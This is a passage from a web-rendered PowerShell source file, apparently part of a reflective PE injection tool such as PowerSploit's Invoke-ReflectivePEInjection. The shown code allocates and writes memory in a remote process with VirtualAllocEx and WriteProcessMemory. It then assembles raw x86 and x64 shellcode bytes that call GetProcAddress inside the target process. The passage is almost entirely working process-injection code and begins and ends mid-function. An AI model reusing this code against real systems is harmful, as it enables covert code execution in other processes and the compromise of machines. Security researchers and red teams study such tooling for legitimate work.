          <td id="LC1458" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span><span class="pl-k">=</span><span class="pl-c1">1</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span><span class="pl-k">=</span><span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L1459" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1459"></td>
          <td id="LC1459" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]</td>
        </tr>
        <tr>
          <td id="L1460" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1460"></td>
          <td id="LC1460" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$RemoteDllHandle</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L1461" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1461"></td>
          <td id="LC1461" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1462" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1462"></td>
          <td id="LC1462" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span><span class="pl-k">=</span><span class="pl-c1">2</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span><span class="pl-k">=</span><span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L1463" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1463"></td>
          <td id="LC1463" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]</td>
        </tr>
        <tr>
          <td id="L1464" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1464"></td>
          <td id="LC1464" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$FunctionNamePtr</span><span class="pl-k">,</span><span class="pl-c"><span class="pl-c">#</span>This can either be a ptr to a string which is the function name, or, if LoadByOrdinal is &#39;true&#39; this is an ordinal number (points to nothing)</span></td>
        </tr>
        <tr>
          <td id="L1465" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1465"></td>
          <td id="LC1465" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1466" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1466"></td>
          <td id="LC1466" class="blob-code blob-code-inner js-file-line">        [<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span><span class="pl-k">=</span><span class="pl-c1">3</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span><span class="pl-k">=</span><span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L1467" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1467"></td>
          <td id="LC1467" class="blob-code blob-code-inner js-file-line">        [<span class="pl-k">Bool</span>]</td>
        </tr>
        <tr>
          <td id="L1468" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1468"></td>
          <td id="LC1468" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">$LoadByOrdinal</span></td>
        </tr>
        <tr>
          <td id="L1469" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1469"></td>
          <td id="LC1469" class="blob-code blob-code-inner js-file-line">		)</td>
        </tr>
        <tr>
          <td id="L1470" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1470"></td>
          <td id="LC1470" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1471" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1471"></td>
          <td id="LC1471" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PtrSize</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::SizeOf([<span class="pl-k">Type</span>][<span class="pl-k">IntPtr</span>])</td>
        </tr>
        <tr>
          <td id="L1472" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1472"></td>
          <td id="LC1472" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1473" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1473"></td>
          <td id="LC1473" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$RFuncNamePtr</span> <span class="pl-k">=</span> [<span class="pl-k">IntPtr</span>]::Zero   <span class="pl-c"><span class="pl-c">#</span>Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal</span></td>
        </tr>
        <tr>
          <td id="L1474" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1474"></td>
          <td id="LC1474" class="blob-code blob-code-inner js-file-line">        <span class="pl-c"><span class="pl-c">#</span>If not loading by ordinal, write the function name to the remote process memory</span></td>
        </tr>
        <tr>
          <td id="L1475" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1475"></td>
          <td id="LC1475" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (<span class="pl-k">-not</span> <span class="pl-smi">$LoadByOrdinal</span>)</td>
        </tr>
        <tr>
          <td id="L1476" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1476"></td>
          <td id="LC1476" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="L1477" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1477"></td>
          <td id="LC1477" class="blob-code blob-code-inner js-file-line">        	<span class="pl-smi">$FunctionName</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::PtrToStringAnsi(<span class="pl-smi">$FunctionNamePtr</span>)</td>
        </tr>
        <tr>
          <td id="L1478" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1478"></td>
          <td id="LC1478" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1479" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1479"></td>
          <td id="LC1479" class="blob-code blob-code-inner js-file-line">		    <span class="pl-c"><span class="pl-c">#</span>Write FunctionName to memory (will be used in GetProcAddress)</span></td>
        </tr>
        <tr>
          <td id="L1480" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1480"></td>
          <td id="LC1480" class="blob-code blob-code-inner js-file-line">		    <span class="pl-smi">$FunctionNameSize</span> <span class="pl-k">=</span> [<span class="pl-k">UIntPtr</span>][<span class="pl-k">UInt64</span>]([<span class="pl-k">UInt64</span>]<span class="pl-smi">$FunctionName<span class="pl-smi">.Length</span></span> <span class="pl-k">+</span> <span class="pl-c1">1</span>)</td>
        </tr>
        <tr>
          <td id="L1481" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1481"></td>
          <td id="LC1481" class="blob-code blob-code-inner js-file-line">		    <span class="pl-smi">$RFuncNamePtr</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.VirtualAllocEx.Invoke</span></span>(<span class="pl-smi">$RemoteProcHandle</span><span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]::Zero<span class="pl-k">,</span> <span class="pl-smi">$FunctionNameSize</span><span class="pl-k">,</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.MEM_COMMIT</span></span> <span class="pl-k">-bor</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.MEM_RESERVE</span></span><span class="pl-k">,</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.PAGE_READWRITE</span></span>)</td>
        </tr>
        <tr>
          <td id="L1482" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1482"></td>
          <td id="LC1482" class="blob-code blob-code-inner js-file-line">		    <span class="pl-k">if</span> (<span class="pl-smi">$RFuncNamePtr</span> <span class="pl-k">-eq</span> [<span class="pl-k">IntPtr</span>]::Zero)</td>
        </tr>
        <tr>
          <td id="L1483" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1483"></td>
          <td id="LC1483" class="blob-code blob-code-inner js-file-line">		    {</td>
        </tr>
        <tr>
          <td id="L1484" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1484"></td>
          <td id="LC1484" class="blob-code blob-code-inner js-file-line">			    <span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Unable to allocate memory in the remote process<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L1485" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1485"></td>
          <td id="LC1485" class="blob-code blob-code-inner js-file-line">		    }</td>
        </tr>
        <tr>
          <td id="L1486" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1486"></td>
          <td id="LC1486" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1487" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1487"></td>
          <td id="LC1487" class="blob-code blob-code-inner js-file-line">		    [<span class="pl-k">UIntPtr</span>]<span class="pl-smi">$NumBytesWritten</span> <span class="pl-k">=</span> [<span class="pl-k">UIntPtr</span>]::Zero</td>
        </tr>
        <tr>
          <td id="L1488" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1488"></td>
          <td id="LC1488" class="blob-code blob-code-inner js-file-line">		    <span class="pl-smi">$Success</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.WriteProcessMemory.Invoke</span></span>(<span class="pl-smi">$RemoteProcHandle</span><span class="pl-k">,</span> <span class="pl-smi">$RFuncNamePtr</span><span class="pl-k">,</span> <span class="pl-smi">$FunctionNamePtr</span><span class="pl-k">,</span> <span class="pl-smi">$FunctionNameSize</span><span class="pl-k">,</span> [<span class="pl-k">Ref</span>]<span class="pl-smi">$NumBytesWritten</span>)</td>
        </tr>
        <tr>
          <td id="L1489" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1489"></td>
          <td id="LC1489" class="blob-code blob-code-inner js-file-line">		    <span class="pl-k">if</span> (<span class="pl-smi">$Success</span> <span class="pl-k">-eq</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L1490" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1490"></td>
          <td id="LC1490" class="blob-code blob-code-inner js-file-line">		    {</td>
        </tr>
        <tr>
          <td id="L1491" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1491"></td>
          <td id="LC1491" class="blob-code blob-code-inner js-file-line">			    <span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Unable to write DLL path to remote process memory<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L1492" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1492"></td>
          <td id="LC1492" class="blob-code blob-code-inner js-file-line">		    }</td>
        </tr>
        <tr>
          <td id="L1493" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1493"></td>
          <td id="LC1493" class="blob-code blob-code-inner js-file-line">		    <span class="pl-k">if</span> (<span class="pl-smi">$FunctionNameSize</span> <span class="pl-k">-ne</span> <span class="pl-smi">$NumBytesWritten</span>)</td>
        </tr>
        <tr>
          <td id="L1494" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1494"></td>
          <td id="LC1494" class="blob-code blob-code-inner js-file-line">		    {</td>
        </tr>
        <tr>
          <td id="L1495" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1495"></td>
          <td id="LC1495" class="blob-code blob-code-inner js-file-line">			    <span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Didn&#39;t write the expected amount of bytes when writing a DLL path to load to the remote process<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L1496" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1496"></td>
          <td id="LC1496" class="blob-code blob-code-inner js-file-line">		    }</td>
        </tr>
        <tr>
          <td id="L1497" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1497"></td>
          <td id="LC1497" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="L1498" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1498"></td>
          <td id="LC1498" class="blob-code blob-code-inner js-file-line">        <span class="pl-c"><span class="pl-c">#</span>If loading by ordinal, just set RFuncNamePtr to be the ordinal number</span></td>
        </tr>
        <tr>
          <td id="L1499" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1499"></td>
          <td id="LC1499" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L1500" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1500"></td>
          <td id="LC1500" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="L1501" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1501"></td>
          <td id="LC1501" class="blob-code blob-code-inner js-file-line">            <span class="pl-smi">$RFuncNamePtr</span> <span class="pl-k">=</span> <span class="pl-smi">$FunctionNamePtr</span></td>
        </tr>
        <tr>
          <td id="L1502" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1502"></td>
          <td id="LC1502" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="L1503" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1503"></td>
          <td id="LC1503" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1504" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1504"></td>
          <td id="LC1504" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Get address of GetProcAddress</span></td>
        </tr>
        <tr>
          <td id="L1505" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1505"></td>
          <td id="LC1505" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Kernel32Handle</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.GetModuleHandle.Invoke</span></span>(<span class="pl-s"><span class="pl-pds">&quot;</span>kernel32.dll<span class="pl-pds">&quot;</span></span>)</td>
        </tr>
        <tr>
          <td id="L1506" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1506"></td>
          <td id="LC1506" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$GetProcAddressAddr</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.GetProcAddress.Invoke</span></span>(<span class="pl-smi">$Kernel32Handle</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&quot;</span>GetProcAddress<span class="pl-pds">&quot;</span></span>) <span class="pl-c"><span class="pl-c">#</span>Kernel32 loaded to the same address for all processes</span></td>
        </tr>
        <tr>
          <td id="L1507" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1507"></td>
          <td id="LC1507" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1508" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1508"></td>
          <td id="LC1508" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1509" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1509"></td>
          <td id="LC1509" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Allocate memory for the address returned by GetProcAddress</span></td>
        </tr>
        <tr>
          <td id="L1510" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1510"></td>
          <td id="LC1510" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$GetProcAddressRetMem</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.VirtualAllocEx.Invoke</span></span>(<span class="pl-smi">$RemoteProcHandle</span><span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]::Zero<span class="pl-k">,</span> [<span class="pl-k">UInt64</span>][<span class="pl-k">UInt64</span>]<span class="pl-smi">$PtrSize</span><span class="pl-k">,</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.MEM_COMMIT</span></span> <span class="pl-k">-bor</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.MEM_RESERVE</span></span><span class="pl-k">,</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.PAGE_READWRITE</span></span>)</td>
        </tr>
        <tr>
          <td id="L1511" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1511"></td>
          <td id="LC1511" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$GetProcAddressRetMem</span> <span class="pl-k">-eq</span> [<span class="pl-k">IntPtr</span>]::Zero)</td>
        </tr>
        <tr>
          <td id="L1512" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1512"></td>
          <td id="LC1512" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1513" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1513"></td>
          <td id="LC1513" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Unable to allocate memory in the remote process for the return value of GetProcAddress<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L1514" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1514"></td>
          <td id="LC1514" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1515" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1515"></td>
          <td id="LC1515" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1516" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1516"></td>
          <td id="LC1516" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1517" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1517"></td>
          <td id="LC1517" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Write Shellcode to the remote process which will call GetProcAddress</span></td>
        </tr>
        <tr>
          <td id="L1518" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1518"></td>
          <td id="LC1518" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Shellcode: GetProcAddress.asm</span></td>
        </tr>
        <tr>
          <td id="L1519" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1519"></td>
          <td id="LC1519" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">Byte</span>[]]<span class="pl-smi">$GetProcAddressSC</span> <span class="pl-k">=</span> <span class="pl-k">@</span>()</td>
        </tr>
        <tr>
          <td id="L1520" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1520"></td>
          <td id="LC1520" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$PEInfo<span class="pl-smi">.PE64Bit</span></span> <span class="pl-k">-eq</span> <span class="pl-c1">$true</span>)</td>
        </tr>
        <tr>
          <td id="L1521" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1521"></td>
          <td id="LC1521" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1522" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1522"></td>
          <td id="LC1522" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$GetProcAddressSC1</span> <span class="pl-k">=</span> <span class="pl-k">@</span>(<span class="pl-c1">0x53</span><span class="pl-k">,</span> <span class="pl-c1">0x48</span><span class="pl-k">,</span> <span class="pl-c1">0x89</span><span class="pl-k">,</span> <span class="pl-c1">0xe3</span><span class="pl-k">,</span> <span class="pl-c1">0x48</span><span class="pl-k">,</span> <span class="pl-c1">0x83</span><span class="pl-k">,</span> <span class="pl-c1">0xec</span><span class="pl-k">,</span> <span class="pl-c1">0x20</span><span class="pl-k">,</span> <span class="pl-c1">0x66</span><span class="pl-k">,</span> <span class="pl-c1">0x83</span><span class="pl-k">,</span> <span class="pl-c1">0xe4</span><span class="pl-k">,</span> <span class="pl-c1">0xc0</span><span class="pl-k">,</span> <span class="pl-c1">0x48</span><span class="pl-k">,</span> <span class="pl-c1">0xb9</span>)</td>
        </tr>
        <tr>
          <td id="L1523" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1523"></td>
          <td id="LC1523" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$GetProcAddressSC2</span> <span class="pl-k">=</span> <span class="pl-k">@</span>(<span class="pl-c1">0x48</span><span class="pl-k">,</span> <span class="pl-c1">0xba</span>)</td>
        </tr>
        <tr>
          <td id="L1524" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1524"></td>
          <td id="LC1524" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$GetProcAddressSC3</span> <span class="pl-k">=</span> <span class="pl-k">@</span>(<span class="pl-c1">0x48</span><span class="pl-k">,</span> <span class="pl-c1">0xb8</span>)</td>
        </tr>
        <tr>
          <td id="L1525" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1525"></td>
          <td id="LC1525" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$GetProcAddressSC4</span> <span class="pl-k">=</span> <span class="pl-k">@</span>(<span class="pl-c1">0xff</span><span class="pl-k">,</span> <span class="pl-c1">0xd0</span><span class="pl-k">,</span> <span class="pl-c1">0x48</span><span class="pl-k">,</span> <span class="pl-c1">0xb9</span>)</td>
        </tr>
        <tr>
          <td id="L1526" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1526"></td>
          <td id="LC1526" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$GetProcAddressSC5</span> <span class="pl-k">=</span> <span class="pl-k">@</span>(<span class="pl-c1">0x48</span><span class="pl-k">,</span> <span class="pl-c1">0x89</span><span class="pl-k">,</span> <span class="pl-c1">0x01</span><span class="pl-k">,</span> <span class="pl-c1">0x48</span><span class="pl-k">,</span> <span class="pl-c1">0x89</span><span class="pl-k">,</span> <span class="pl-c1">0xdc</span><span class="pl-k">,</span> <span class="pl-c1">0x5b</span><span class="pl-k">,</span> <span class="pl-c1">0xc3</span>)</td>
        </tr>
        <tr>
          <td id="L1527" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1527"></td>
          <td id="LC1527" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1528" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1528"></td>
          <td id="LC1528" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L1529" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1529"></td>
          <td id="LC1529" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1530" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1530"></td>
          <td id="LC1530" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$GetProcAddressSC1</span> <span class="pl-k">=</span> <span class="pl-k">@</span>(<span class="pl-c1">0x53</span><span class="pl-k">,</span> <span class="pl-c1">0x89</span><span class="pl-k">,</span> <span class="pl-c1">0xe3</span><span class="pl-k">,</span> <span class="pl-c1">0x83</span><span class="pl-k">,</span> <span class="pl-c1">0xe4</span><span class="pl-k">,</span> <span class="pl-c1">0xc0</span><span class="pl-k">,</span> <span class="pl-c1">0xb8</span>)</td>
        </tr>
        <tr>
          <td id="L1531" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1531"></td>
          <td id="LC1531" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$GetProcAddressSC2</span> <span class="pl-k">=</span> <span class="pl-k">@</span>(<span class="pl-c1">0xb9</span>)</td>
        </tr>
        <tr>
          <td id="L1532" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1532"></td>
          <td id="LC1532" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$GetProcAddressSC3</span> <span class="pl-k">=</span> <span class="pl-k">@</span>(<span class="pl-c1">0x51</span><span class="pl-k">,</span> <span class="pl-c1">0x50</span><span class="pl-k">,</span> <span class="pl-c1">0xb8</span>)</td>
        </tr>
        <tr>
          <td id="L1533" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1533"></td>
          <td id="LC1533" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$GetProcAddressSC4</span> <span class="pl-k">=</span> <span class="pl-k">@</span>(<span class="pl-c1">0xff</span><span class="pl-k">,</span> <span class="pl-c1">0xd0</span><span class="pl-k">,</span> <span class="pl-c1">0xb9</span>)</td>
        </tr>
        <tr>
          <td id="L1534" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1534"></td>
          <td id="LC1534" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$GetProcAddressSC5</span> <span class="pl-k">=</span> <span class="pl-k">@</span>(<span class="pl-c1">0x89</span><span class="pl-k">,</span> <span class="pl-c1">0x01</span><span class="pl-k">,</span> <span class="pl-c1">0x89</span><span class="pl-k">,</span> <span class="pl-c1">0xdc</span><span class="pl-k">,</span> <span class="pl-c1">0x5b</span><span class="pl-k">,</span> <span class="pl-c1">0xc3</span>)</td>
        </tr>
        <tr>
          <td id="L1535" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1535"></td>
          <td id="LC1535" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1536" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1536"></td>
          <td id="LC1536" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$SCLength</span> <span class="pl-k">=</span> <span class="pl-smi">$GetProcAddressSC1<span class="pl-smi">.Length</span></span> <span class="pl-k">+</span> <span class="pl-smi">$GetProcAddressSC2<span class="pl-smi">.Length</span></span> <span class="pl-k">+</span> <span class="pl-smi">$GetProcAddressSC3<span class="pl-smi">.Length</span></span> <span class="pl-k">+</span> <span class="pl-smi">$GetProcAddressSC4<span class="pl-smi">.Length</span></span> <span class="pl-k">+</span> <span class="pl-smi">$GetProcAddressSC5<span class="pl-smi">.Length</span></span> <span class="pl-k">+</span> (<span class="pl-smi">$PtrSize</span> <span class="pl-k">*</span> <span class="pl-c1">4</span>)</td>
        </tr>
        <tr>
          <td id="L1537" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1537"></td>
          <td id="LC1537" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$SCPSMem</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::AllocHGlobal(<span class="pl-smi">$SCLength</span>)</td>
        </tr>
        <tr>
          <td id="L1538" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1538"></td>
          <td id="LC1538" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$SCPSMemOriginal</span> <span class="pl-k">=</span> <span class="pl-smi">$SCPSMem</span></td>
        </tr>
        <tr>
          <td id="L1539" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1539"></td>
          <td id="LC1539" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1540" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1540"></td>
          <td id="LC1540" class="blob-code blob-code-inner js-file-line">		<span class="pl-c1">Write-BytesToMemory</span> <span class="pl-k">-</span>Bytes <span class="pl-smi">$GetProcAddressSC1</span> <span class="pl-k">-</span>MemoryAddress <span class="pl-smi">$SCPSMem</span></td>
        </tr>
        <tr>
          <td id="L1541" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1541"></td>
          <td id="LC1541" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$SCPSMem</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> <span class="pl-smi">$SCPSMem</span> (<span class="pl-smi">$GetProcAddressSC1<span class="pl-smi">.Length</span></span>)</td>
        </tr>
        <tr>
          <td id="L1542" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1542"></td>
          <td id="LC1542" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::StructureToPtr(<span class="pl-smi">$RemoteDllHandle</span><span class="pl-k">,</span> <span class="pl-smi">$SCPSMem</span><span class="pl-k">,</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L1543" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1543"></td>
          <td id="LC1543" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$SCPSMem</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> <span class="pl-smi">$SCPSMem</span> (<span class="pl-smi">$PtrSize</span>)</td>
        </tr>
        <tr>
          <td id="L1544" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1544"></td>
